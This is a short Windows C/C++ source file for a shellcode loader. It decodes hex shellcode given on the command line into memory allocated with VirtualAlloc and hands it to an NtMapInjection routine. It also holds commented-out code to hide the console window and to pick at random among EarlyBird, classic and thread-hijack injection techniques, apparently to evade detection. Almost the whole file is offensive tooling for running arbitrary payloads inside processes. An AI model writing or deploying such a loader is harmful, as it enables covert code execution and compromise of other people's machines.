#include "pch.h"

LPVOID lpShellcode = NULL;
int main(int argc, char* argv[]) {
    //Uncomment to Hide cmd window
    //HWND hWnd = GetConsoleWindow();
    //ShowWindow( hWnd, SW_HIDE );
    if (argc <2)
    {
        printf("usage: ./this.exe <hex-shellcode>\n");
        return 0;
    }
    unsigned int char_in_hex;



    char* shellcode = argv[1];

    unsigned int iterations = strlen(shellcode);

    
    

    unsigned int memory_allocation = strlen(shellcode) / 2;
    lpShellcode = VirtualAlloc(NULL, 0x1000, MEM_COMMIT , PAGE_READWRITE);
    int error = GetLastError();
    for (unsigned int i = 0; i < iterations /2; i++) {
        sscanf_s(shellcode + 2 * i, "%2X", &char_in_hex);
        shellcode[i] = (char)char_in_hex;
    }
    memcpy(lpShellcode, shellcode, iterations / 2);
   
    srand((unsigned int)GetCurrentProcessId());

    int random = rand()%4;
    NtMapInjection(lpShellcode, memory_allocation);
    /*
    switch (random)
    {
    case 0:
        EarlyBird(lpShellcode, memory_allocation);
        break;
    case 1:
        EarlyBird2(lpShellcode, memory_allocation);
        break;
    case 2:
        ClassicInjection(lpShellcode, memory_allocation);
        break;
    case 3:
        ThreadHijack(lpShellcode, memory_allocation);
        break;
    }
    */
    return 0;
}